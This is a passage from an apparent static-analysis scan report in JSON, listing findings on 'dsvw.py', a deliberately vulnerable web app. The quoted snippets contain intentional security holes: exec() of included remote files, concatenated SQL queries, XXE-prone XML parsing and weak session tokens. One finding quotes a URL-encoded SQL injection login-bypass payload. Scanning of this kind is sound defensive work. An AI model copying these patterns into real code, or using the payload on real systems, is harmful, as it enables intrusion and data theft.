self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}", "highlightLines": [56]}, "category": "code", "location": {"file": "dsvw.py", "line": 56, "column": 154}, "severity": "high", "references": [], "description": ""}, {"id": "b3d146450770", "fix": {"template": null, "available": false}, "title": "URL open with user input - potential SSRF", "ruleId": "rules.py-urllib-user-url", "snippet": {"code": "                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.request.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}", "highlightLines": [56]}, "category": "code", "location": {"file": "dsvw.py", "line": 56, "column": 154}, "severity": "medium", "references": [], "description": ""}, {"id": "d735222a295d", "fix": {"template": null, "available": false}, "title": "urlopen without timeout - can cause indefinite blocking, vulnerable to slowloris attacks (CWE-400)", "ruleId": "rules.py-urlopen-no-timeout", "snippet": {"code": "                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params[\"include\"], \"rb\") if not \"://\" in params[\"include\"] else urllib.request.urlopen(params[\"include\"])).read(), {\"DOCUMENT_ROOT\": os.getcwd(), \"HTTP_USER_AGENT\": self.headers.get(\"User-Agent\"), \"REMOTE_ADDR\": self.client_address[0], \"REMOTE_PORT\": self.client_address[1], \"PATH\": path, \"QUERY_STRING\": query}", "highlightLines": [56]}, "category": "code", "location": {"file": "dsvw.py", "line": 56, "column": 169}, "severity": "medium", "references": [], "description": ""}, {"id": "c83dd192972e", "fix": {"template": null, "available": false}, "title": "Python exec() - code injection risk", "ruleId": "rules.py-exec-call", "snippet": {"code": "                    exec(program, envs)", "highlightLines": [57]}, "category": "code", "location": {"file": "dsvw.py", "line": 57, "column": 21}, "severity": "high", "references": [], "description": ""}, {"id": "320060afd35e", "fix": {"template": null, "available": false}, "title": "Compiled regex findall - ensure pattern is not vulnerable to ReDoS", "ruleId": "rules.py-redos-compiled-findall", "snippet": {"code": "                content = \"%s%s%s\" % (\"\" if not \"callback\" in params else \"%s(\" % params[\"callback\"], json.dumps(dict((_.findtext(\"username\"), _.findtext(\"surname\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\"))), \"\" if not \"callback\" in params else \")\")", "highlightLines": [65]}, "category": "code", "location": {"file": "dsvw.py", "line": 65, "column": 176}, "severity": "info", "references": [], "description": ""}, {"id": "a17615961bbd", "fix": {"template": null, "available": false}, "title": "XML Element findall with XPath - potential XPath injection (CWE-643)", "ruleId": "rules.py-xpath-etree-findall", "snippet": {"code": "                content = \"%s%s%s\" % (\"\" if not \"callback\" in params else \"%s(\" % params[\"callback\"], json.dumps(dict((_.findtext(\"username\"), _.findtext(\"surname\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\"))), \"\" if not \"callback\" in params else \")\")", "highlightLines": [65]}, "category": "code", "location": {"file": "dsvw.py", "line": 65, "column": 176}, "severity": "medium", "references": [], "description": ""}, {"id": "3334e93818fc", "fix": {"template": null, "available": false}, "title": "XML parsing with variable data - XXE risk (CWE-611)", "ruleId": "rules.py-xxe-parse-var", "snippet": {"code": "                content = \"%s%s%s\" % (\"\" if not \"callback\" in params else \"%s(\" % params[\"callback\"], json.dumps(dict((_.findtext(\"username\"), _.findtext(\"surname\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\"))), \"\" if not \"callback\" in params else \")\")", "highlightLines": [65]}, "category": "code", "location": {"file": "dsvw.py", "line": 65, "column": 198}, "severity": "medium", "references": [], "description": ""}, {"id": "a2a4d84d120f", "fix": {"template": null, "available": false}, "title": "SQL query with string concatenation - SQL injection risk", "ruleId": "rules.py-sql-concat", "snippet": {"code": "                cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")", "highlightLines": [67]}, "category": "code", "location": {"file": "dsvw.py", "line": 67, "column": 17}, "severity": "high", "references": [], "description": ""}, {"id": "6f9ea2ff86be", "fix": {"template": null, "available": false}, "title": "SQLite execute with concatenation - SQL injection (CWE-89)", "ruleId": "rules.py-sqlite-execute-concat", "snippet": {"code": "                cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")", "highlightLines": [67]}, "category": "code", "location": {"file": "dsvw.py", "line": 67, "column": 17}, "severity": "high", "references": [], "description": ""}, {"id": "fa8fccfb494f", "fix": {"template": null, "available": false}, "title": "SQL injection - SELECT query concatenated with variable (CWE-89)", "ruleId": "rules.py-sqli-string-plus-var", "snippet": {"code": "                cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")", "highlightLines": [67]}, "category": "code", "location": {"file": "dsvw.py", "line": 67, "column": 32}, "severity": "high", "references": [], "description": ""}, {"id": "84d04c23f04f", "fix": {"template": null, "available": false}, "title": "Regex sub - ensure pattern is not vulnerable to ReDoS (CWE-1333)", "ruleId": "rules.py-redos-re-sub", "snippet": {"code": "                cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")", "highlightLines": [67]}, "category": "code", "location": {"file": "dsvw.py", "line": 67, "column": 73}, "severity": "info", "references": [], "description": ""}, {"id": "281621f35a6d", "fix": {"template": null, "available": false}, "title": "Input from .get() may be reflected - sanitize before output (CWE-79)", "ruleId": "rules.py-reflected-input-get-method", "snippet": {"code": "                cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")", "highlightLines": [67]}, "category": "code", "location": {"file": "dsvw.py", "line": 67, "column": 100}, "severity": "info", "references": [], "description": ""}, {"id": "480dbd549fae", "fix": {"template": null, "available": false}, "title": "Empty password/secret string detected (CWE-258)", "ruleId": "rules.py-empty-password", "snippet": {"code": "                cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")", "highlightLines": [67]}, "category": "code", "location": {"file": "dsvw.py", "line": 67, "column": 131}, "severity": "medium", "references": [], "description": ""}, {"id": "4232ad14b673", "fix": {"template": null, "available": false}, "title": "Regex sub - ensure pattern is not vulnerable to ReDoS (CWE-1333)", "ruleId": "rules.py-redos-re-sub", "snippet": {"code": "                content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\"><meta http-equiv=\\\"refresh\\\" content=\\\"1; url=/\\\"/>\" % (re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")), \"\".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else \"The username and/or password is incorrect<meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\\\">\"", "highlightLines": [68]}, "category": "code", "location": {"file": "dsvw.py", "line": 68, "column": 167}, "severity": "info", "references": [], "description": ""}, {"id": "bef9057b0818", "fix": {"template": null, "available": false}, "title": "Input from .get() may be reflected - sanitize before output (CWE-79)", "ruleId": "rules.py-reflected-input-get-method", "snippet": {"code": "                content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\"><meta http-equiv=\\\"refresh\\\" content=\\\"1; url=/\\\"/>\" % (re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")), \"\".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else \"The username and/or password is incorrect<meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\\\">\"", "highlightLines": [68]}, "category": "code", "location": {"file": "dsvw.py", "line": 68, "column": 194}, "severity": "info", "references": [], "description": ""}, {"id": "e594522c580b", "fix": {"template": null, "available": false}, "title": "random module is not cryptographically secure - use secrets module (CWE-338)", "ruleId": "rules.py-random-insecure-call", "snippet": {"code": "                content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\"><meta http-equiv=\\\"refresh\\\" content=\\\"1; url=/\\\"/>\" % (re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")), \"\".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else \"The username and/or password is incorrect<meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\\\">\"", "highlightLines": [68]}, "category": "code", "location": {"file": "dsvw.py", "line": 68, "column": 225}, "severity": "medium", "references": [], "description": ""}, {"id": "eda092a6101a", "fix": {"template": null, "available": false}, "title": "random.sample() is not cryptographically secure - use secrets module (CWE-338)", "ruleId": "rules.py-random-sample", "snippet": {"code": "                content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\"><meta http-equiv=\\\"refresh\\\" content=\\\"1; url=/\\\"/>\" % (re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")), \"\".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else \"The username and/or password is incorrect<meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\\\">\"", "highlightLines": [68]}, "category": "code", "location": {"file": "dsvw.py", "line": 68, "column": 225}, "severity": "medium", "references": [], "description": ""}, {"id": "76edc91636bc", "fix": {"template": null, "available": false}, "title": "Input from .get() may be reflected - sanitize before output (CWE-79)", "ruleId": "rules.py-reflected-input-get-method", "snippet": {"code": "            self.send_header(\"Content-Type\", \"%s%s\" % (\"text/html\" if content.startswith(\"<!DOCTYPE html>\") else \"text/plain\", \"; charset=%s\" % params.get(\"charset\", \"utf8\")))", "highlightLines": [78]}, "category": "code", "location": {"file": "dsvw.py", "line": 78, "column": 151}, "severity": "info", "references": [], "description": ""}, {"id": "89289d5e6004", "fix": {"template": null, "available": false}, "title": "Print statement found - consider using logging", "ruleId": "rules.py-print-statement", "snippet": {"code": "    print(\"%s #v%s\\n by: %s\\n\\n[i] running HTTP server at 'http://%s:%d'...\" % (NAME, VERSION, AUTHOR, LISTEN_ADDRESS, LISTEN_PORT))", "highlightLines": [90]}, "category": "code", "location": {"file": "dsvw.py", "line": 90, "column": 5}, "severity": "info", "references": [], "description": ""}, {"id": "9d8de59601f3", "fix": {"template": null, "available": false}, "title": "Catching KeyboardInterrupt may prevent clean shutdown - use signal handlers instead", "ruleId": "rules.py-keyboard-interrupt-catch", "snippet": {"code": "    except KeyboardInterrupt:", "highlightLines": [93]}, "category": "code", "location": {"file": "dsvw.py", "line": 93, "column": 5}, "severity": "info", "references": [], "description": ""}, {"id": "b5017679b08f", "fix": {"template": null, "available": false}, "title": "Printing exception details - use logging and avoid exposing to users (CWE-209)", "ruleId": "rules.py-print-exception", "snippet": {"code": "        print(\"[x] exception occurred ('%s')\" % ex)", "highlightLines": [96]}, "category": "code", "location": {"file": "dsvw.py", "line": 96, "column": 9}, "severity": "info", "references": [], "description": ""}, {"id": "5b838e6bb0ac", "fix": {"template": null, "available": false}, "title": "Print statement found - consider using logging", "ruleId": "rules.py-print-statement", "snippet": {"code": "        print(\"[x] exception occurred ('%s')\" % ex)", "highlightLines": [96]}, "category": "code", "location": {"file": "dsvw.py", "line": 96, "column": 9}, "severity": "info", "references": [], "description": ""}, {"id": "f0253abb5c51", "fix": {"template": "Move to environment variable and rotate the exposed secret immediately", "available": true}, "title": "Exposed Secret: Generic Secret Assignment in Config", "ruleId": "gitleaks-generic-secret-assignment", "snippet": {"code": "password=%27%20OR%20%271%27%20LIKE%20%271\"", "highlightLines": [12]}, "category": "secrets", "location": {"file": "dsvw.py", "line": 12}, "severity": "critical", "description": "Found generic-secret-assignment in source code"}]}]